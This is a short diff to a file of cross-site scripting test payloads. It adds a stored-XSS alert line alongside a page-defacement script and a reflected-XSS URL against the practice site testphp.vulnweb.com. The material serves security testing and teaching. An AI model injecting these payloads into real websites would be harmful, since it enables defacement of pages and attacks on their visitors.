@@ -78,4 +78,6 @@ XSS - attack PAYLOADS
 <script>document.body.innerHTML = "<h1>You've been
 hacked!</h1>";</script>
 
+<script>alert("Stored XSS");</script>
+
 https://testphp.vulnweb.com/search.php?query=<script>alert('URL XSS');</script>
